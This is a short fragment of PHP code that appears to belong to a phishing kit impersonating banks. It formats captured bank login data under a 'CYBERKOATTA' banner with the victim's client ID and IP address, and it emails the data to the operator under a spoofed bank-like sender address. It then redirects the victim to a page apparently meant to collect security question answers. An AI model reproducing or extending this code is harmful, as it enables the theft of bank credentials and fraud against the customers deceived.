...
# Logs 
$message = "[⚓️ CYBERKOATTA ⚓️ ST Marys'S BANK ⚓️ CLIENT ⚓️ :{$client} ⚓️]\n\n";
...
if ($settings['send_mail'] == "1"){
       ...
       $headers .= "From: MrWeeBee <m&tbank@client_{$client}_site.com>\r\n";
       $subject = "⚓️ CYBERKOATTA ⚓️ CU_1 BANK ⚓️ LOGIN ⚓️ CLIENT ⚓️ #{$client} ⚓️ {$IP}";
       $msg = $message;
...
if($settings['double_login'] == "1"){
    ...
    echo "<script>window.location.href = \"../session_questions\"; </script>";
    }
